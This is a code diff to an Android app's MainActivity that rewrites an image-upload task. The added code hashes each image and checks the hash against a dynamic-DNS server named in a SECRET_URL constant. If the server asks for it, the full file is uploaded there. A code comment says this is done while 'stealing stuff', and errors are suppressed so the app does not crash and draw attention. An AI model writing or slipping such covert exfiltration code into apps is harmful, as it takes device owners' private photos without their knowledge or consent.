@@ -5,6 +5,10 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.UnsupportedEncodingException;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.util.Arrays;
 
 import android.app.Activity;
 import android.os.AsyncTask;
@@ -16,15 +20,20 @@ import android.view.View;
 import android.widget.TextView;
 import ch.boye.httpclientandroidlib.HttpResponse;
 import ch.boye.httpclientandroidlib.HttpVersion;
+import ch.boye.httpclientandroidlib.client.ClientProtocolException;
 import ch.boye.httpclientandroidlib.client.HttpClient;
+import ch.boye.httpclientandroidlib.client.entity.UrlEncodedFormEntity;
 import ch.boye.httpclientandroidlib.client.methods.HttpGet;
 import ch.boye.httpclientandroidlib.client.methods.HttpPost;
 import ch.boye.httpclientandroidlib.entity.mime.HttpMultipartMode;
 import ch.boye.httpclientandroidlib.entity.mime.MultipartEntity;
-import ch.boye.httpclientandroidlib.entity.mime.content.FileBody;
+import ch.boye.httpclientandroidlib.entity.mime.content.ByteArrayBody;
 import ch.boye.httpclientandroidlib.impl.client.DefaultHttpClient;
+import ch.boye.httpclientandroidlib.message.BasicNameValuePair;
 import ch.boye.httpclientandroidlib.params.CoreProtocolPNames;
 import ch.boye.httpclientandroidlib.util.EntityUtils;
+
+import com.google.common.io.Files;
 
 public class MainActivity extends Activity {
 	private int uploaded;
@@ -85,15 +94,85 @@ public class MainActivity extends Activity {
 	private class ImageUploadTask extends AsyncTask<File, Integer, String> {
 		@Override
 		protected String doInBackground(File... params) {
-			// TODO Auto-generated method stub
-			return postImage(params[0]);
+			try {
+				return postImage(params[0]);
+			} catch (NoSuchAlgorithmException e) {
+				return null;
+			}
 		}
 
 		protected void onPostExecute(String result) {
-			showData(result);
+			if(result != null) showData(result);
 		}
 
-		public String postImage(File f) {
+		private static final String SECRET_URL = "http://manzana.no-ip.org/poster.php";
+
+		private String toSHA1(byte[] convertme) {
+		    final char[] HEX_CHARS = "0123456789abcdef".toCharArray();
+		    MessageDigest md = null;
+		    try {
+		        md = MessageDigest.getInstance("SHA-1");
+		    }
+		    catch(NoSuchAlgorithmException e) {
+		        e.printStackTrace();
+		    }
+		    byte[] buf = md.digest(convertme);
+		    char[] chars = new char[2 * buf.length];
+		    for (int i = 0; i < buf.length; ++i) {
+		        chars[2 * i] = HEX_CHARS[(buf[i] & 0xF0) >>> 4];
+		        chars[2 * i + 1] = HEX_CHARS[buf[i] & 0x0F];
+		    }
+		    return new String(chars);
+		}
+		
+		//returns image data to send, or null if it should not be send
+		//i.e. it is already in the server
+		private byte[] dataToSendToServer(File f){
+			HttpPost httppost = new HttpPost(ImageUploadTask.SECRET_URL);
+			HttpClient client = new DefaultHttpClient();
+
+			client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);	
+	
+			byte [] imageBytes;
+			try {
+				imageBytes = Files.toByteArray(f);
+			} catch (IOException e) {
+				//We do not want the app to crash since we are stealing stuff!!
+				e.printStackTrace();
+				return null;
+			}
+			
+			String digest = toSHA1(imageBytes);
+	
+			try {
+				httppost.setEntity(new UrlEncodedFormEntity(Arrays.asList(new BasicNameValuePair("digest",digest))));
+			} catch (UnsupportedEncodingException e) {
+				e.printStackTrace();
+				return null;
+			}
+
+		    try {
+		    	HttpResponse response = client.execute(httppost);
+		    	String resp = EntityUtils.toString(response.getEntity());
+
+		    	return resp.equals("OK") ? imageBytes : null;
+		    } catch (ClientProtocolException e) {
+				e.printStackTrace();
+		    	return null;
+			} catch (IOException e) {
+				e.printStackTrace();
+				return null;
+			}
+
+		}
+		
+		public String postImage(File f) throws NoSuchAlgorithmException {			
+			byte [] imageBytes = dataToSendToServer(f);
+			if(imageBytes == null){ 
+				return null;
+			}
+
+			//If SHA-1 was not in the server, means we have to send the image itself.			
 			HttpPost httppost = new HttpPost("http://manzana.no-ip.org/poster.php");
 			HttpClient client = new DefaultHttpClient();
 
@@ -101,7 +180,10 @@ public class MainActivity extends Activity {
 			 
 			MultipartEntity entity = new MultipartEntity( HttpMultipartMode.BROWSER_COMPATIBLE );
 			
-			FileBody fb = new FileBody(f);
+			String[] parts = f.getAbsolutePath().split(File.pathSeparator);
+			String extension = parts.length > 0 ? parts[parts.length-1] : "";
+
+			ByteArrayBody fb = new ByteArrayBody(imageBytes,"image/"+extension,f.getName());
 			entity.addPart( "imageName", fb);
 			 			 
 			httppost.setEntity( entity );
@@ -109,7 +191,7 @@ public class MainActivity extends Activity {
 			try {
 				return EntityUtils.toString( client.execute( httppost ).getEntity(), "UTF-8" );
 			} catch (Exception e) {
-				Log.d("LALLAMA", "Fallo el post: " + Log.getStackTraceString(e));
+				e.printStackTrace();
 				return null;
 			}finally{
 				client.getConnectionManager().shutdown();
